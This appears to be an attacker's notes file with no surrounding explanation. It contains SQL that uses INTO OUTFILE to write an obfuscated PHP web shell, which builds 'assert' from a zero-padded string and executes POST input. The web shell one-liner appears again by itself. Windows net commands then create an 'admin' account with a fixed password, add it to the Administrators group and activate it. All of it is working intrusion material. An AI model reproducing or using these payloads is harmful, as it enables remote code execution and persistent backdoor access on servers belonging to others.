create table tp_weath (cmd text not null);
insert into tp_weath (cmd) values ("<?php $_=str_replace('0','','a0s00s000e0000r00000t');$_($_POST['s']);");
select cmd from tp_weath into outfile 'w.php';
drop table if exists tp_weath;


<?php $_=str_replace('0','','a0s00s000e0000r00000t');$_($_POST['s']);


#1添加用户
net user admin[用户名] lovechina[密码] /add
#2分配用户组
net localgroup Administrators admin /add
#3激活用户
net user admin /active:yes

